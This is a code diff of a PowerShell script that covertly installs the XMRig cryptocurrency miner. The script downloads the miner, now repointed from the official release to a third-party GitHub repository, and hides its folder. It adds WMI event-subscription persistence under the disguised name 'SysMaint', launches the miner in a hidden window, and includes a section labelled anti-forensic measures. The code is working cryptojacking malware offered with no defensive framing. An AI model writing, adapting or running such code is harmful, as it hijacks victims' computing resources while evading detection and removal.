@@ -72,7 +72,7 @@ New-Item -ItemType Directory -Name "$wd" -Path "$path"
 cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
-Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"
 
 Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
@@ -205,7 +205,7 @@ try {
 
     $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
         Name = "SysMaint_$((Get-Date).Ticks)"
-        CommandLineTemplate = "`"$destinationPath`" --donate-level=0"
+        CommandLineTemplate = "`"$destinationPath`" --donate-level=1"
         RunInteractively = $false
     }
 
@@ -220,7 +220,7 @@ catch {
 
 # 4. Immediate Execution (Hidden)
 if (-not (Get-Process -Name (Get-Item $destinationPath).BaseName -ErrorAction SilentlyContinue)) {
-    Start-Process $destinationPath -ArgumentList "--donate-level=0" -WindowStyle Hidden
+    Start-Process $destinationPath -ArgumentList "--donate-level=1" -WindowStyle Hidden
 }
 
 # 5. Anti-Forensic Measures
